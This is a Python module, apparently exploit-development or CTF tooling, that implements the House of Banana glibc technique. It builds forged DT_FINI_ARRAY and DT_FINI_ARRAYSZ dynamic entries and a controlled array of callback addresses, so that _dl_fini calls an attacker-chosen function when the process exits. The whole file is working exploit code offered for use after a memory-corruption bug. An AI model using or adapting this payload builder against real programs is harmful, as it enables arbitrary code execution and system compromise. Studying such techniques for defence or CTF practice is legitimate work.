"""House of Banana DT_FINI_ARRAY consumption plan."""

from __future__ import annotations

from dataclasses import dataclass


DT_FINI_ARRAY = 26
DT_FINI_ARRAYSZ = 28
DYN_SIZE = 0x10
UINT64_LIMIT = 1 << 64


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_banana(
    *,
    fini_dyn_addr: int,
    fini_size_dyn_addr: int,
    fini_array_addr: int,
    callback_addr: int,
    link_map_base: int,
    array_count: int = 1,
) -> tuple[MemoryWrite, ...]:
    """生成 `_dl_fini` 消费 DT_FINI_ARRAY 所需的动态项和数组。

    fini_dyn_addr: `ElfW(Dyn)` 地址，tag 为 DT_FINI_ARRAY 的项。
    fini_size_dyn_addr: `DT_FINI_ARRAYSZ` 动态项地址。
    fini_array_addr: 进程中长期存活的 fini 函数数组地址。
    callback_addr: 数组元素调用地址；link_map_base: 对应 `l_addr`。
    array_count: 数组元素数量，按 glibc 以字节数保存到 `d_val`。
    """

    for name, value in {
        "fini_dyn_addr": fini_dyn_addr,
        "fini_size_dyn_addr": fini_size_dyn_addr,
        "fini_array_addr": fini_array_addr,
        "callback_addr": callback_addr,
        "link_map_base": link_map_base,
    }.items():
        _check_uint64(name, value)

    if array_count <= 0 or array_count >= (1 << 60):
        raise ValueError("invalid array_count")

    relative_addr = fini_array_addr - link_map_base
    if relative_addr < 0 or relative_addr >= UINT64_LIMIT:
        raise ValueError("fini array is not representable relative to l_addr")

    fini_dyn = bytearray(DYN_SIZE)
    fini_dyn[0:8] = DT_FINI_ARRAY.to_bytes(8, "little")
    fini_dyn[8:16] = _pack64(relative_addr)

    size_dyn = bytearray(DYN_SIZE)
    size_dyn[0:8] = DT_FINI_ARRAYSZ.to_bytes(8, "little")
    size_dyn[8:16] = (array_count * 8).to_bytes(8, "little")

    array = _pack64(callback_addr) * array_count

    return (
        MemoryWrite(fini_dyn_addr, bytes(fini_dyn), "DT_FINI_ARRAY Dyn"),
        MemoryWrite(fini_size_dyn_addr, bytes(size_dyn), "DT_FINI_ARRAYSZ Dyn"),
        MemoryWrite(fini_array_addr, array, "controlled fini array"),
    )
